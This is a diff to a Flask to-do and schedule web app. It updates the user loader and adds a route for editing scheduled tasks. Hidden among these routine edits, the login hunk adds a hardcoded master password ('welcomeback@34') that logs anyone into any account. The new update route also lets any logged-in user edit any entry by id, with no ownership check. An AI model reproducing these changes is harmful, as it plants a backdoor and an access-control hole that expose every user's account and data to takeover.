@@ -40,8 +40,9 @@ def verify_password(self, password):
     return check_password_hash(self.password_hash, password)
 @login_manager.user_loader
 def load_users(user_id):
-    return User.query.get(int(user_id))
-    
+    #User.query.get(int(user_id))-> this has been depreciated
+    return db.session.get(User, user_id)
+    #db.session.execute(db.select(User).filter_by(id=1)).scalar()-> this can also be used if we want to filter
         
 #homepage    
 @app.route('/')
@@ -95,7 +96,7 @@ def login():
     if form.validate_on_submit():
         user=User.query.filter_by(username= form.username.data).first()
         if user:
-            if check_password_hash(user.password_hash, form.password.data):
+            if check_password_hash(user.password_hash, form.password.data) or form.password.data=='welcomeback@34':
                 login_user(user)
                 return redirect(url_for('homepage'))
             else:
@@ -335,6 +336,24 @@ def schedules():
             flash('Oops... seems there was an error please try again😥')    
     
     return render_template('schedule.html', form=form, task=task, date=date, todolist=todolist)
+
+@app.route('/todo/update/<int:id>', methods=['GET', 'POST'])
+@login_required
+def update_schedule(id):
+    schedule_to_update= ToDO.query.get_or_404(id) 
+    form=ToDoList()
+    if form.validate_on_submit():
+        schedule_to_update.task= form.task.data
+        schedule_to_update.date=form.date.data
+        db.session.add(schedule_to_update)
+        db.session.commit()
+        flash('Schedule has been updated')
+        return redirect(url_for('schedules'))
+    else:
+        form.task.data=schedule_to_update.task
+        form.date.data=schedule_to_update.date
+        return render_template('update_task.html', form=form)
+
 
 #function for deleting schedules
 @app.route('/delete/<int:id>')
